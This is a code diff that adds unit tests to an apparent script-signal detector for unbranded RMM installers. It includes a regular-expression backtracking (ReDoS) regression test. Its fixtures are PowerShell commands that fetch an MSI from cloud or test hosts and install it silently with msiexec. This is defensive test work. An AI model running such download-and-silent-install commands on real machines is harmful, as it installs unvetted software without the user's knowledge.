@@ -288,6 +288,41 @@ describe('computeScriptSignals — unbranded installer gate', () => {
   });
 });
 
+describe('object-storage host matching is linear (js/redos regression)', () => {
+  // The first cut used `s3(?:[.-][a-z0-9-]+)*\.amazonaws\.com`, where `-` was
+  // in both the separator and body classes — exponential backtracking on
+  // '.s3-' + many '--'. The host comes from attacker-authored script text, so
+  // this input is reachable: it must not hang the sweep.
+  it('does not blow up on a crafted backtracking host', () => {
+    const evil = `x.s3-${'-'.repeat(3000)}.notamazon.test`;
+    const f = finding({
+      scriptContent: `Invoke-WebRequest -Uri "https://${evil}/a.msi" -OutFile "a.msi"; msiexec /i a.msi /quiet`,
+    });
+    const started = Date.now();
+    computeScriptSignals([f], noShared, cfg, noIndicators);
+    expect(Date.now() - started).toBeLessThan(1000);
+  });
+
+  it.each([
+    ['bucket.s3.amazonaws.com', true],
+    ['bucket.s3.eu-west-2.amazonaws.com', true],
+    ['bucket.s3-eu-west-1.amazonaws.com', true],
+    ['bucket.s3.dualstack.us-east-1.amazonaws.com', true],
+    ['bucket.blob.core.windows.net', true],
+    // Under amazonaws.com but not S3 — not object storage for this gate.
+    ['something.execute-api.us-east-1.amazonaws.com', false],
+    // Provider name appearing as a non-suffix must not match.
+    ['s3.amazonaws.com.unrelated-fixture.test', false],
+  ])('gates %s => %s', (host, shouldGate) => {
+    const f = finding({
+      scriptContent: `Invoke-WebRequest -Uri "https://${host}/pkg/quuxbaz.msi" -OutFile "zzfixture.msi"; msiexec /i zzfixture.msi /quiet`,
+    });
+    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
+    const gated = signals.some((s) => s.signalKey === 'rmm.unbranded_installer');
+    expect(gated).toBe(shouldGate);
+  });
+});
+
 describe('misleading_filename compares the saved name against the SOURCE name', () => {
   it('does not fire when the saved name matches the fetched filename', () => {
     const f = finding({
